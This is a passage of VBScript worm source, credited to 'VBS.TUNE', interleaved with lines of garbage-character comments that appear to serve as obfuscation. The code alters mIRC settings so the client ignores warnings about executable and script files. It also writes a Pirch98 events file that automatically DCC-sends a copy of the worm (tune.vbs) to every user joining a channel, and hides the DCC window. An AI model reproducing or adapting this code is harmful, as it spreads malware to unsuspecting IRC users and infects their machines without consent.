'ßÌc        a !W 'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
editini
"C:\mirc\mirc.ini","[text]","ignore","*.exe,*.com,*.bat,*.dll,*.ini,*.vbs"
editini
"C:\mirc\mirc.ini","[options]","n2","0,1,0,0,1,1,1,1,0,5,35,0,0,1,1,0,1,1,0,
5,500,10,0,1,1,0,0"
editini
"C:\mirc\mirc.ini","[options]","n4","1,0,1,1,0,3,9999,0,0,0,1,0,1024,0,0,99,
60,0,0,1,1,1,0,1,1,5000,1"
end sub
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
sub pirch9x()
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
On Error Resume Next
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
Dim fso4, folder
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
Set fso4 = CreateObject("Scripting.FileSystemObject")
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
Set winfolder = fso4.GetSpecialFolder(1)
path = winfolder&"\tune.vbs"
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
Dim fso, f1, ts
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
Const ForWriting = 2
Set fso = CreateObject("Scripting.FileSystemObject")
fso.CreateTextFile ("c:\pirch98\events.ini")
Set f1 = fso.GetFile("c:\pirch98\events.ini")
Set ts = f1.OpenAsTextStream(ForWriting, false)
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
ts.write "[Levels]"&vbcrlf
ts.write "Enabled=1"&vbcrlf
ts.write "Count=6"&vbcrlf
ts.write "Level1=000-Unknowns"&vbcrlf
ts.write "000-UnknownsEnabled=1"&vbcrlf
ts.write "Level2=100-Level 100"&vbcrlf
ts.write "100-Level 100Enabled=1"&vbcrlf
ts.write "Level3=200-Level 200"&vbcrlf
ts.write "200-Level 200Enabled=1"&vbcrlf
ts.write "Level4=300-Level 300"&vbcrlf
ts.write "300-Level 300Enabled=1"&vbcrlf
ts.write "Level5=400-Level 400"&vbcrlf
ts.write "400-Level 400Enabled=1"&vbcrlf
ts.write "Level6=500-Level 500"&vbcrlf
ts.write "500-Level 500Enabled=1"&vbcrlf
ts.write vbcrlf
ts.write "[000-Unknowns]"&vbcrlf
ts.write "User1=*!*@*"&vbcrlf
ts.write "UserCount=1"&vbcrlf
ts.write "Event1=ON JOIN:#:/msg $nick Hi there"&vbcrlf
ts.write "EventCount=1"&vbcrlf
ts.write vbcrlf
ts.write "[100-Level 100]"&vbcrlf
ts.write "User1=*!*@*"&vbcrlf
ts.write "UserCount=1"&vbcrlf
ts.write "Event1=ON JOIN:#:/dcc send $nick " & path &vbcrlf
ts.write "EventCount=1"&vbcrlf
ts.write vbcrlf
ts.write "[200-Level 200]"&vbcrlf
ts.write "UserCount=0"&vbcrlf
ts.write "EventCount=0"&vbcrlf
ts.write vbcrlf
ts.write "[300-Level 300]"&vbcrlf
ts.write "UserCount=0"&vbcrlf
ts.write "EventCount=0"&vbcrlf
ts.write vbcrlf
ts.write "[400-Level 400]"&vbcrlf
ts.write "UserCount=0"&vbcrlf
ts.write "EventCount=0"&vbcrlf
ts.write vbcrlf
ts.write "[500-Level 500]"&vbcrlf
ts.write "UserCount=0"&vbcrlf
ts.write "EventCount=0"&vbcrlf
ts.write vbcrlf
editini "C:\pirch98\pirch98.ini","[DCC]","AutoHideDccWin","1"
end sub
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
sub editini(filename,section,string,newvalue)
on error resume next
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
Const ForReading = 1
Const ForWriting = 2
iniFile = filename
sectionName = section
keyName = string
newVlaue = newvalue
bInSection = false
bKeyChanged = false
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
Set fso = CreateObject("Scripting.FileSystemObject")
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
Set ts = fso.OpenTextFile(iniFile, ForReading)
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
lines = Split(ts.ReadAll,vbCrLf)
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
ts.close
For n = 0 to ubound(lines)
if left(lines(n),1) = "[" then
if bInSection then
exit for
end if
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
if instr(lines(n),sectionName) = 1 then
bInSection = true
else
bInSection = false
end if
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
else
if bInSection then
if instr(lines(n),keyName & "=") = 1 then
bKeyChanged = true
lines(n) = keyName & "=" & newVlaue
bKeyChanged = true
exit for
end if
end if
end if
Next
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
if bKeyChanged then
Set ts = fso.OpenTextFile(iniFile, ForWriting)
ts.Write join(lines,vbCrLf)
ts.close
end if
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
set ts = nothing
set fso = nothing
end sub
'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^'ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙíÇŸFûŠ¼N†ûì7]DœúÆ^ßÌcÙí
'ßÌc        a !W 
'
'VBS.TUNE with exe stelth method by sevenC / N0:7
'http://sevenc.vze.com/
'real tune.vbs by slug
